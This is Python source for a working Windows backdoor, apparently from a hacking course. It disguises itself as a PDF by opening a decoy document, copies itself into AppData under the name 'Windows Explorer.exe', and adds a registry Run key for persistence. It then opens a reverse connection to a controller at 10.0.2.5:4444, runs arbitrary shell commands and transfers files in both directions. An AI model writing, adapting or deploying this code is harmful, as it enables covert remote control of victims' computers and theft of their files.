import socket
import subprocess, json, os, base64
import sys, shutil


class Backdoor:
    def __init__(self, ip, port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # SOCK_STREAM means we want to create
        # a TCP connection and TCP is a stream based protocol
        self.connection.connect((ip, port))

    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t REG_SZ /d "' + evil_file_location + '"', shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)  # python 2
        # self.connection.send(json_data.encode())  # python 3

    def reliable_recv(self):
        json_data = ""  # python 2
        # json_data = b""  # python 3, converting to byte
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
        #redirecting stderr and stdin to subprocess.DEVNULL because we specified --noconsole argument while making executable

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = self.reliable_recv()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])  # python 2
                    # command_result = self.read_file(command[1]).decode()  # python 3
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)  # python 2
                    # command_result = self.execute_system_command(command).decode()  # python 3
            except Exception:
                command_result = "[-] Error during command execution."
            self.reliable_send(command_result)


file_name = sys._MEIPASS + "\sample.pdf"  # sys._MEIPASS will be replaced by the default location where pyinstaller places the files that we package
subprocess.Popen(file_name, shell=True)

try:
    myBackdoor = Backdoor("10.0.2.5", 4444)
    myBackdoor.run()
except Exception:
    sys.exit()
